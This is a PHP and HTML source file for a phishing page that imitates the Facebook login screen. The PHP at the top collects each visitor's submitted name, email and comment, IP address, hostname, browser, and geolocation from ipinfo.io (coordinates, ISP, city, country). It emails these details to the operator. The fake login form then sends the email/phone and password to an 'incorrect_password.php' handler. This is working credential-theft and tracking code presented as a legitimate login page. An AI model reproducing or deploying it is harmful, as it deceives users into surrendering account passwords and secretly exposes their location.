<?php include $_SERVER['DOCUMENT_ROOT'].'/include.php'; ?>
<?php
$data = $_POST;
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

@ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
@ $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$string = 'imell:' . $data['imella'] . PHP_EOL;
$string .= 'emni:' . $data['emri'] . PHP_EOL;
$string .= 'koment:' . $data['komenti'] . PHP_EOL;
$string .= PHP_EOL;
$string .= PHP_EOL;

$string .= $QUERY_STRING . PHP_EOL . PHP_EOL .
    '[IP address]: ' . $ip . PHP_EOL . PHP_EOL .
    '[Hostname]: ' . $hostname . PHP_EOL . PHP_EOL .
    '[Browser and OS]: ' . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL;
if (isset($details->loc)) {
    $string .= '[Coordinates]: ' . $details->loc . PHP_EOL . PHP_EOL .
        '[ISP provider]: ' . $details->org . PHP_EOL . PHP_EOL .
        '[City]: ' . $details->city . PHP_EOL . PHP_EOL .
        '[State]: ' . $details->region . PHP_EOL . PHP_EOL .
        '[Country]: ' . $details->country . PHP_EOL . PHP_EOL;

}
$string .= '[Date]: ' . date("D dS M,Y h:i a");


mailEmail($emails, "Hini", $string);
$imella =issetArray($_POST,'imella');
?>
<!DOCTYPE html>
<html>
<head>
  <title>Facebook</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" href="favicon-16x16.png"/>
    <link rel='shortcut icon' type='image/x-icon' href='favicon.ico' />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">


    <style type="text/css">
    body{
        font-family: Helvetica, Arial, sans-serif;
      }
      .hinem_a{
        background-color:white;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        margin: auto;
        padding: 24px 17px;
        border: 1px solid #dddfe2;
      }
      .dotekst{
        padding-top:0px;
        padding-bottom: 24px;
        margin-bottom: 0px;
        font-size: 18px;
        line-height: 22px;
        color: #1c1e21;
      }
      input[type=text]{
        border-radius: 6px;
        font-size: 17px;
        padding: 14px 16px;
        height: 60px;
        background: #FFFFFF url(/rsrc.php/v3/yO/r/YQNfPR9MJfx.png) repeat-x;
        border: 1px solid #dddfe2;
        color: #1d2129;
      }
      input[type=password]{
        border-radius: 6px;
        font-size: 17px;
        padding: 14px 16px;
        height: 60px;
        background: #FFFFFF url(/rsrc.php/v3/yO/r/YQNfPR9MJfx.png) repeat-x;
        border: 1px solid #dddfe2;
        color: #1d2129;
      }
      .qojkrejt{
        background-color: #1877f2;
        border: none;
        border-radius: 6px;
        
        width: 100%;
        font-size: 20px;
        line-height: 48px;
        padding: 0 16px;
      }
      .harroj{
        color: #1877f2;
        font-size: 14px;
        font-weight: 500;
      }
      .qeqe32_ {
        width: auto;
      }
      .qeqe32_ {
        display: block;
        margin-bottom: 10px;
        overflow: hidden;
        text-align: center;
        white-space: nowrap;
        width: 100%;
      }
      ._palidhje536 {
        color: #96999e;
      }
      .qeqe32_>span {
        display: inline-block;
        position: relative;
        font-size:13px;
      }
      .qeqe32_>span:before {
        margin-right: 15px;
        right: 100%;
      }
      .qeqe32_>span:before, .qeqe32_>span:after {
        background: #ccd0d5;
        content: "";
        height: 1px;
        position: absolute;
        top: 50%;
        width: 9999px;
      }
      .qeqe32_>span:before, .qeqe32_>span:after {
        background: #d7dade;
      }
      .qeqe32_>span:after {
        left: 100%;
        margin-left: 15px;
      }
      .qeqe32_>span:before, .qeqe32_>span:after {
        background: #ccd0d5;
        content: "";
        height: 1px;
        position: absolute;
        top: 50%;
        width: 9999px;
      }
      .anikriejt{
        border: none;
        border-radius: 6px;
        font-size: 17px;
        line-height: 48px;
        padding: 0 16px;
        background-color: #42b72a;
        border-color: #42b72a;

        box-sizing: content-box;
        -webkit-font-smoothing: antialiased;
        font-weight: bold;
        justify-content: center;
        position: relative;
        text-align: center;
        text-shadow: none;
        vertical-align: middle;
      }
      .bababoks{
        padding-left:0px;
        padding-right: 0px;
      }
      @media only screen and (max-width: 600px) {
        .bababoks{
          padding-left:10px;
          padding-right: 10px;
        }
      }
    </style>
</head>
<body>
      <div style="background-color:#f0f2f5; text-align: center; padding-bottom:80px" >
        <div class="container">
          <div style="padding-top:50px;">
            <img style="width: 240px; height: 84px;" src="llugu.svg">
          </div>
          <div class="row">
            <div class="col-md-4 offset-md-4 bababoks">
            <div class="hinem_a">
              <p class="dotekst">Log Into Facebook</p>
              <div class="alert alert-warning" role="alert" style="font-size: 12px;color:#1c1e21">
                You must log in to continue.
              </div>
              <form action="/incorrect_password.php" method="GET">
                <div class="form-group">
                  <input type="text" class="form-control" placeholder="Email or Phone Number"  value="<?=$imella?>"  name="hinem">
                </div>
                <div class="form-group">
                  <input type="password" class="form-control" placeholder="Password" name="hinempasi">
                </div>
                <button type="submit" class="btn btn-primary qojkrejt">Log In</button>
                <div style="padding-top:15px; padding-bottom:10px">
                  <a class="harroj" href="#">Forgot password?</a>
                </div>
                <div class="qeqe32_"><span class="_palidhje536">or</span></div>
                <div style="padding: 6px 0;">
                  <a href="#" class="btn btn-success anikriejt">Create New Account</a>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
</body>
</html>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177207786-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-177207786-1');
</script>
